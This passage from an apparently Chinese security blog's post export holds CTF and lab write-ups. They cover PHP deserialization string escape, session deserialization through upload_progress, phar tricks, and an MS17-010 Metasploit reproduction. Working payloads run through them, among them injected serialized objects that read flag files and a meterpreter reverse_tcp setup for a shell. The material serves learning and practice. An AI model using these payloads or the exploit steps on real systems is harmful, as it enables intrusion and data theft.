当我们$_GET传入的是_session[img]=“index.php”时,经过了extract函数后会产生$_session[img]=index.php 这里分析代码 先是赋值: $_SESSION[“user”] = ‘guest’;$_SESSION[‘function’] = $function; //若想要显示源码,$f=’show_image’; $_SESSION[‘img’]也只能等于base64_encode(‘guest_img.png’);因为若我们传入参数img_PATH的话img的值会进行sha1加密,而后面是没有解密的 可知三个变量都是我们不能控制的,这里就能够有很多种解了,通过extract()进行变量覆盖 0x02 反序列化字符串逃逸_session可控后,就可以有很多种解法了,这里提供两种解法: 值逃逸payload1:_SESSION[user]=flagflagflagflagflagflagflagphp&amp;_SESSION[function]=function&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}传入的字符串反序列化后: a:3;{s:4:&quot;user&quot;;s:31:&quot;flagflagflagflagflagflagflagphp&quot;; s:8:&quot;function&quot;;s:82:&quot;function&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;; s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} 经过过滤函数后: a:3;{s:4:&quot;user&quot;;s:31:&quot;&quot;;s:8:&quot;function&quot;;s:82:&quot;function&quot;; s:8:&quot;function&quot;;s:10:&quot;show_image&quot;; s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;} //;&quot;s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} 键逃逸payload2:_SESSION[flagphp]=;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;} 传入的字符串反序列化后: a:2:{s:7:&quot;flagphp&quot;; s:48:&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;; s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} 经过过滤函数后: a:2:{s:7:&quot;&quot;;s:48:&quot;; s:1:&quot;a&quot;; s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot; //;&quot;s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} 还有就是写payload最好在本地写,然后看它反序列化后的样子在更改,不然有些小毛病自己发现不了(现在能力太差了) 然后继续读就可以了","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://pp1ove.gitee.io/tags/反序列化/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"session反序列化","slug":"session反序列化","date":"2021-01-16T05:08:54.000Z","updated":"2021-01-17T11:54:05.766Z","comments":false,"path":"2021/01/16/session反序列化/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/16/session反序列化/","excerpt":"","text":"Session反序列化先来了解一下关于session的一些基础知识什么是session?在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。 session是如何起作用的当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。 session_start()这个函数当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。 php.ini中一些Session配置session 的存储机制php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的 Directive 含义 session.save_handler session保存形式。默认为files session.save_path session保存路径。 session.serialize_handler session序列化存储所用处理器。默认为php。 session.upload_progress.cleanup 一旦读取了所有POST数据，立即清除进度信息。默认开启 //若漏洞存在,此项应该为off session.upload_progress.enabled 将上传文件的进度信息存在session中。默认开启。 session储存处理器： php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值 php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 这里就不举例了,网上有很多例子 利用条件 session.serialize_handler 处理器不相同 session.upload_progress.cleanup off session.upload_progress.enabled on 关于session.upload_progress.enabled，这里存在一个php的bug, https://bugs.php.net/bug.php?id=71101 需要先上传文件，同时POST一个与session.upload_process.name的同名变量。后端会自动将POST的这个同名变量作为键进行序列化然后存储到session文件中。下次请求就会反序列化session文件，从中取出这个键。 具体作用可以去看官方文档,官方文档写得挺详细的,这里就不详细的讲了https://www.php.net/manual/zh/session.upload-progress.php 这里需要在本地写一段post表单来上传至服务器 //有了这个漏洞之后我们就可以控制session的值 &lt;form action=&quot;URL&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 然后,在session里面就会产生这样的数据: 这里的foo.avi则是上传的文件名字,可以被我们所控制,设置为payload,然后就需要利用所说的session.serialize_handler 处理器的差异问题,若我们将这里的foo.avi改成一个反序列化字符串,再在前面加上|,这里可以类似于双引号逃逸 这里为本地测试的结果: 这里假设我们的payload为序列化字符串， 原本我们的payload是被双引号给包裹起来的,导致我们的payload无法进行序列化,但是当我们的payload前面加了|，字符串xxx“|payload”,第一个双引号被当作了键值,而|后面的字符串也会进行反序列化,导致我们的payload成功执行,可以根据下面的图片来理解 若session文件以php_serialize+| 存储,php方式读取 若session以php存储和读取： //这里若把s:71前面的|移动到O:5前面也可达到同样的效果(这样说可能方便一下理解) 接下来就开始实战吧 CTF例题：phpinfo()题目地址: http://web.jarvisoj.com:32784/ 首先看下phpinfo; 这里有很多配置,其中最有用的是这几个画红线的配置 session.auto.start是在访问时生成存储session文件的,和session_start()作用相同,因为这题有session_start()，所以说这题为off也同样产生了漏洞，当然session.use_strict_mode默认值为0时也可自己设置session ID session.serialize_handler后面的session处理器出现了差异 session.upload_progress.cleanup若为on,则会自动清除session文件,所以应为Off（若为On时,可以采用条件竞争) session.upload_progress.enabled php的bug 修改session文件这里编写表单: &lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 将其插入到html代码中 随便选择文件使用burp抓包 修改filename的值为payload //注意此处的双引号要转义,因为我们要将其存储到文件中,这里可以看见payload已经执行成功 读取文件内容： 通过file_get_contents读取文件内容 设置$mdzz=‘O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:87:&quot;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;))&quot;;} 序列话结果 O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&quot;;} 文件名设置为 |O:5:\\&quot;OowoO\\&quot;:1:{s:4:\\&quot;mdzz\\&quot;;s:88:\\&quot;print_r(file_get_contents(\\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\&quot;));\\&quot;;}。 相关文章:https://news.ssssafe.com/archives/1493","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://pp1ove.gitee.io/tags/反序列化/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"反序列化总结(持续更新)","slug":"反序列化","date":"2021-01-15T03:04:22.000Z","updated":"2021-01-17T11:54:00.799Z","comments":false,"path":"2021/01/15/反序列化/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/15/反序列化/","excerpt":"","text":"反序列化总结(持续更新)常见魔法函数 __construct() __destruct() __get() __set() __isset() __unset() __sleep() __wakeup() 序列化后的字符串需要使用urlencode()进行编码，因为字符串含有不可见字符%00 如: protected :%00*%00 小技巧__wakeup()绕过(CVE-2016-7124) 存在漏洞的PHP版本: PHP5.6.25之前版本和7.0.10之前的7.x版本。 漏洞概述: __wakeup()魔法函数被绕过,导致执行了一些非预期效果的漏洞。 漏洞原理: 当对象的属性(变量)数大于实际的个数时,__wakeup()魔法函数被绕过 相关题目: phar 反序列化最初是在 Black Hat 上安全研究员 Same Thomas 分享的议题.phar 反序列化漏洞,利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。 利用条件 phar 文件能够上传。 文件操作函数参数可控, : ,/ phar 等特殊字符没有被过滤。 有可用的魔术方法作为”跳板”。 bypass phar:// 不能出现在首部这时候我们可以利用compress.zlib:// 或compress.bzip2://函数,compress.zlib://和compress.bzip2://同样适用于phar://。 payload: compress.zlib://phar://phar.phar/test.txt Postgresql &lt;?php $pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;)); $pdo-&gt;pgsqlCopyFromFile(&#39;aa&#39;, &#39;phar://test.phar/aa&#39;); pgsqlCopyToFile和pg_trace同样也是能使用的，只是它们需要开启phar的写功能。 MySQL LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper. 但是需要修改mysqld配置,因为不是默认配置。 [mysqld] local-infile=1 secure_file_priv=&quot;&quot; ### 字符串逃逸：出自漏洞（CVE-2015-8562)，这个漏洞产生的原因是在于序列化的字符串数据没有被过滤函数正确处理,最终反序列化(目前我认为是因为先进行序列化,然后又使用函数替换了危险函数,导致长度改变) 相关题目：0CTF 2016 piapiapia php session 反序列化首先要知道了是PHP session 的引擎的差异, 这也是导致这个漏洞的根本原因和利用条件。 session 的存储机制php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的 inset(‘session.save.handler’,’php’) session_star()访问页面时给用户一个session session_name设置对话名称 session.save_path 设置session的存储路径session.save_handler 设定用户自定义存储函数session.auto_start 指定会话模块是否在请求开始时启动一个会话session.serialize_handler 定义用来序列化/反序列化的处理器名字。默认使用php php 键名＋竖线＋经过serialize()函数反序列处理的值 php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 php_serialize serialize()函数反序列处理数组方式 存储机制php中的session内容是以文件方式来存储的，由session.save_handler来决定。文件名由sess_sessionid命名，文件内容则为session序列化后的值 但是怎么做都做不出来http://web.jarvisoj.com:32784/，留下疑问吧 https://www.cnblogs.com/zzjdbk/p/12995217.html 参考链接：https://mp.weixin.qq.com/s?src=11&amp;timestamp=1610679686&amp;ver=2829&amp;signature=dT0Rm6Vl*xDBsXJDQcytMIXDsbCia30-qhuAUhC4TUMrJHsedOZ9ArYnY7F7WfBnOWvpqM47eM1Fdc4TD7F0zWAVsY6Zax6E6E3EBh7IhNwaT**2QChuJRQm3ZeDc3LT&amp;new=1 session总结：https://mp.weixin.qq.com/s?src=11&amp;timestamp=1610717650&amp;ver=2830&amp;signature=1Eb6Rxd4Q*bj8pVJuld6tPPVxVajsBIgOBRm8jjb4FVHuV332Gkv7Q3Ocm2kwEbV3cQ0qRILLhO0oPJUrg*zuO9D70-Q6fOcyEtciST4OcT8AXLcFXUhIcbZSengWFvf&amp;new=1","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[{"name":"总结","slug":"总结","permalink":"https://pp1ove.gitee.io/tags/总结/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"MS17-010漏洞的复现","slug":"ms17-010","date":"2021-01-14T06:17:47.000Z","updated":"2021-01-14T06:19:03.238Z","comments":false,"path":"2021/01/14/ms17-010/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/14/ms17-010/","excerpt":"","text":"MS17010 (永恒之蓝)漏洞概述:永恒之蓝漏洞是利用框架中一个针对SMB服务(445端口，主要用于连接unix系列系统和windows)进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。 漏洞原理：MS17-010漏洞出现在的原因是SrvOs2FeaListSizeToNt在计算需要分配的内存长度时存在问题，以至于可以溢出到邻近的内存块，攻击者向 Windows SMBv1 服务器发送特殊设计的消息，可以远程命令执行。 环境搭建：kail：192.168.182.130 win7：192.168.182.128 注意事项：win7需要注意以下几点： 关闭防火请 开启远程服务 kail与win7相互ping通 开启445端口 漏洞利用***扫描sacnner首先打开msf，命令行输入msfconsole， //注意，当第一次使用时需要连接数据库 然后search MS17-010 msf &gt; use auxiliary/scanner/smb/smb_ms17_010 //选择需要使用的模块 msf &gt; show options //查看可设置选项 msf &gt;auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.182.128 //设置ip或IP段 msf &gt;auxiliary(scanner/smb/smb_ms17_010) &gt; exploit //探测是否存在漏洞 ***攻击exploitmsf &gt;auxiliary(scanner/smb/smb_ms17_010) &gt; back //返回 可以使用谷歌语法查找到所需要的模块 search type:exploit name:ms17 选择模块 msf &gt; show options //查看可设置选项 msf &gt; auxiliary(smb_ms17_010) &gt; set RHOSTS 192.168.182.130 //设置ip ***Payload模块show payloads //选择所需要的payload set payload windows/x64/meterpreter/reverse_tcp //选择payload options //查看选项 set lport 445 //设置端口号 set lhost 192.168.182.130 //设置主机的IP options查看设置： 关键的设置无误后开始攻击 （rhost，lhost，rport，lport） 获取shell： 创建用户： 漏洞修复： 为计算机安装最新的安全补丁，微软已发布补丁MS17-010修复了“永恒之蓝”攻击的系统漏洞。 关闭445、135、137、138、139端口，关闭网络共享。 \\","categories":[{"name":"复现","slug":"复现","permalink":"https://pp1ove.gitee.io/categories/复现/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://pp1ove.gitee.io/tags/漏洞复现/"}],"keywords":[{"name":"复现","slug":"复现","permalink":"https://pp1ove.gitee.io/categories/复现/"}]}]}